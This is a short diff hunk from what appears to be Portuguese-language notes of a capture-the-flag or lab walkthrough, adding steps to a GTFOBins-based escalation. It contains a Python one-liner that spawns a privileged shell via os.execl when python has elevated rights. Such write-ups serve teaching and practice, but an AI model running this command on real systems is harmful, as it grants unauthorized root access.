@@ -90,6 +90,8 @@ encontrei arquivos que pareciam ser interessante
 pesquisei sobre get sudo python:
 
 https://gtfobins.github.io/gtfobins/python/#sudo
+entrar na pasta /usr/bin/
+executar o comando:
 
 ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
